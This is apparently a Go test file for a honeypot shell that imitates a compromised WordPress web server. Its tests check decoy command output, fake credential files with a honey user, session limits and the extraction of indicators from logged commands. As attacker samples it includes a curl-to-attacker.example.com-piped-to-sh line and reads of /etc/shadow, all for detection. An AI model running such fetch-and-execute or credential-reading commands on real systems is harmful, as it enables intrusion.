package honeysh

import (
	"bytes"
	"math/rand"
	"strings"
	"sync"
	"testing"
	"time"
)

// captureLogger records all events for inspection.
type captureLogger struct {
	mu       sync.Mutex
	starts   []SessionMeta
	commands []CommandEvent
	endRes   string
	end      SessionEnd
}

func (c *captureLogger) OnSessionStart(m SessionMeta)       { c.mu.Lock(); defer c.mu.Unlock(); c.starts = append(c.starts, m) }
func (c *captureLogger) OnCommand(e CommandEvent)           { c.mu.Lock(); defer c.mu.Unlock(); c.commands = append(c.commands, e) }
func (c *captureLogger) OnSessionEnd(r string, e SessionEnd) { c.mu.Lock(); defer c.mu.Unlock(); c.endRes = r; c.end = e }

// testConfig returns a Config with no real latency or randomness.
func testConfig() Config {
	return Config{
		User: "www-data", Host: "webhost", CWD: "/var/www/html",
		MaxCommands: 32, MaxDuration: time.Minute,
		LatencyMin: 0, LatencyMax: 0,
		Rand:  rand.New(rand.NewSource(42)),
		Sleep: func(time.Duration) {}, // no real sleeping in tests
		Now:   func() time.Time { return time.Unix(1700000000, 0).UTC() },
	}
}

func runShell(t *testing.T, input string) (*captureLogger, string) {
	t.Helper()
	cfg := testConfig()
	log := &captureLogger{}
	s := New(cfg, log)
	stdout := &bytes.Buffer{}
	_, err := s.Serve(strings.NewReader(input), stdout, SessionMeta{})
	if err != nil {
		t.Fatalf("Serve: %v", err)
	}
	return log, stdout.String()
}

func TestServe_PromptShown(t *testing.T) {
	_, out := runShell(t, "id\n")
	if !strings.Contains(out, "www-data@webhost:/var/www/html$") {
		t.Fatalf("prompt missing: %q", out)
	}
}

func TestServe_IDResponse(t *testing.T) {
	log, out := runShell(t, "id\n")
	if !strings.Contains(out, "uid=33(www-data)") {
		t.Fatalf("id output wrong: %q", out)
	}
	if len(log.commands) != 1 || log.commands[0].Command != "id" {
		t.Fatalf("expected one command 'id', got %+v", log.commands)
	}
}

func TestServe_UnameAllRealistic(t *testing.T) {
	_, out := runShell(t, "uname -a\n")
	if !strings.Contains(out, "Linux webhost") || !strings.Contains(out, "GNU/Linux") {
		t.Fatalf("uname -a should look plausible: %q", out)
	}
}

func TestServe_FakeShadowReturned(t *testing.T) {
	_, out := runShell(t, "cat /etc/shadow\n")
	// Must contain a yescrypt-looking hash AND a honey user (deploy).
	if !strings.Contains(out, "$y$") {
		t.Fatalf("decoy shadow missing yescrypt prefix: %q", out)
	}
	if !strings.Contains(out, "deploy:") {
		t.Fatalf("decoy shadow missing honey user: %q", out)
	}
}

func TestServe_FakePasswdHasHoneyUser(t *testing.T) {
	_, out := runShell(t, "cat /etc/passwd\n")
	if !strings.Contains(out, "deploy:x:1001:1001") {
		t.Fatalf("decoy passwd missing honey user: %q", out)
	}
}

func TestServe_UnknownCommandReplicatedBash(t *testing.T) {
	_, out := runShell(t, "totallymadeup_xyzzy\n")
	if !strings.Contains(out, "command not found") {
		t.Fatalf("unknown command must say 'command not found': %q", out)
	}
}

func TestServe_SudoLooksReal(t *testing.T) {
	_, out := runShell(t, "sudo -i\n")
	if !strings.Contains(out, "not in the sudoers file") {
		t.Fatalf("sudo lie missing: %q", out)
	}
}

func TestServe_CDUpdatesPrompt(t *testing.T) {
	_, out := runShell(t, "cd /tmp\npwd\n")
	if !strings.Contains(out, "/tmp") {
		t.Fatalf("cd /tmp + pwd should show /tmp: %q", out)
	}
	// And the second prompt should reflect /tmp.
	prompts := strings.Count(out, "www-data@webhost:/tmp$")
	if prompts == 0 {
		t.Fatalf("prompt after cd should show /tmp: %q", out)
	}
}

func TestServe_ExitEndsSession(t *testing.T) {
	log, _ := runShell(t, "id\nexit\nthis_should_not_run\n")
	if log.endRes != "attacker_exit" {
		t.Fatalf("end reason=%q want attacker_exit", log.endRes)
	}
	for _, c := range log.commands {
		if c.Command == "this_should_not_run" {
			t.Fatal("commands after exit should NOT be processed")
		}
	}
}

func TestServe_MaxCommandsEndsSession(t *testing.T) {
	cfg := testConfig()
	cfg.MaxCommands = 3
	log := &captureLogger{}
	s := New(cfg, log)
	stdout := &bytes.Buffer{}
	// Five commands; should stop after 3.
	_, _ = s.Serve(strings.NewReader("id\nuname\nwhoami\npwd\nls\n"), stdout, SessionMeta{})
	if log.endRes != "max_commands" {
		t.Fatalf("expected max_commands end reason, got %q", log.endRes)
	}
	if log.end.Commands != 3 {
		t.Fatalf("expected 3 commands processed, got %d", log.end.Commands)
	}
}

func TestServe_LSDefaultDir(t *testing.T) {
	_, out := runShell(t, "ls\n")
	// Default cwd is /var/www/html — should list WordPress-y things.
	if !strings.Contains(out, "wp-config.php") {
		t.Fatalf("default ls should look like wordpress dir: %q", out)
	}
}

func TestServe_LSSlash(t *testing.T) {
	_, out := runShell(t, "ls /\n")
	for _, d := range []string{"bin", "etc", "var", "tmp"} {
		if !strings.Contains(out, d) {
			t.Errorf("ls / missing %q in: %q", d, out)
		}
	}
}

func TestServe_LSLongFormat(t *testing.T) {
	_, out := runShell(t, "ls -la /\n")
	if !strings.Contains(out, "drwxr-xr-x") {
		t.Fatalf("ls -la should show permission mode: %q", out)
	}
}

func TestServe_ExtractsIOCs(t *testing.T) {
	log, _ := runShell(t, "echo curl http://attacker.example.com/x | sh\n")
	if len(log.commands) != 1 {
		t.Fatalf("expected 1 command, got %d", len(log.commands))
	}
	c := log.commands[0]
	if len(c.URLs) == 0 || c.URLs[0] != "http://attacker.example.com/x" {
		t.Fatalf("URL not extracted: %v", c.URLs)
	}
	if len(c.Domains) == 0 {
		t.Fatalf("domain not extracted from: %q (got %v)", c.Raw, c.Domains)
	}
}

func TestServe_ExtractsIPs(t *testing.T) {
	log, _ := runShell(t, "ping 8.8.4.4\n")
	if len(log.commands) != 1 {
		t.Fatal("expected 1 command")
	}
	if len(log.commands[0].IPs) != 1 || log.commands[0].IPs[0] != "8.8.4.4" {
		t.Fatalf("IP not extracted: %v", log.commands[0].IPs)
	}
}

func TestServe_ParseFirstSnipsPipes(t *testing.T) {
	log, _ := runShell(t, "ps aux | grep nginx\n")
	if len(log.commands) != 1 || log.commands[0].Command != "ps" {
		t.Fatalf("piped command first token should be 'ps': %+v", log.commands)
	}
}

func TestServe_ParseFirstStripsLeadingEnvAssignments(t *testing.T) {
	log, _ := runShell(t, "PATH=/tmp ls /\n")
	if len(log.commands) != 1 || log.commands[0].Command != "ls" {
		t.Fatalf("env-prefixed command first token should be 'ls': %+v", log.commands)
	}
}

func TestServe_LogsSessionStartAndEnd(t *testing.T) {
	log, _ := runShell(t, "id\n")
	if len(log.starts) != 1 {
		t.Fatalf("expected 1 session start, got %d", len(log.starts))
	}
	if log.starts[0].SessionID == "" {
		t.Fatal("SessionID should be assigned")
	}
	if log.end.SessionID != log.starts[0].SessionID {
		t.Fatal("Start and End SessionIDs must match")
	}
}

func TestServe_RecordsLatencyPerCommand(t *testing.T) {
	cfg := testConfig()
	cfg.LatencyMin = 100 * time.Millisecond
	cfg.LatencyMax = 200 * time.Millisecond
	cfg.Sleep = func(d time.Duration) {} // don't really sleep
	log := &captureLogger{}
	s := New(cfg, log)
	_, _ = s.Serve(strings.NewReader("id\n"), &bytes.Buffer{}, SessionMeta{})
	if len(log.commands) != 1 {
		t.Fatal("expected 1 command")
	}
	lat := log.commands[0].Latency
	if lat < 100*time.Millisecond || lat > 200*time.Millisecond {
		t.Fatalf("latency %v outside expected band", lat)
	}
}

func TestServe_AttributionPassedThrough(t *testing.T) {
	log := &captureLogger{}
	s := New(testConfig(), log)
	_, _ = s.Serve(strings.NewReader("id\n"), &bytes.Buffer{}, SessionMeta{
		RemoteIP:    "10.20.30.40",
		PID:         1234,
		LineageID:   77,
		ServiceName: "nginx-main",
	})
	if log.starts[0].RemoteIP != "10.20.30.40" {
		t.Fatalf("attribution RemoteIP not propagated: %+v", log.starts[0])
	}
	if log.starts[0].LineageID != 77 {
		t.Fatal("attribution LineageID not propagated")
	}
}

func TestRespondTo_AllCommonRecons(t *testing.T) {
	cfgTmp := testConfig()
	cfg := cfgTmp.defaulted()
	cases := []struct {
		cmd   string
		needs []string
	}{
		{"id", []string{"uid=", "www-data"}},
		{"whoami", []string{"www-data"}},
		{"hostname", []string{"webhost"}},
		{"pwd", []string{"/var/www/html"}},
		{"env", []string{"USER=www-data", "PATH="}},
		{"ps", []string{"PID", "nginx"}},
		{"netstat", []string{"LISTEN"}},
		{"ss", []string{"tcp"}},
		{"ifconfig", []string{"eth0", "inet 10."}},
		{"df", []string{"Filesystem"}},
		{"free", []string{"Mem:", "Swap:"}},
		{"uptime", []string{"load average"}},
	}
	for _, tc := range cases {
		got := respondTo(tc.cmd, nil, &cfg, "/var/www/html")
		for _, n := range tc.needs {
			if !strings.Contains(got, n) {
				t.Errorf("respondTo(%s) missing %q in: %q", tc.cmd, n, got)
			}
		}
	}
}
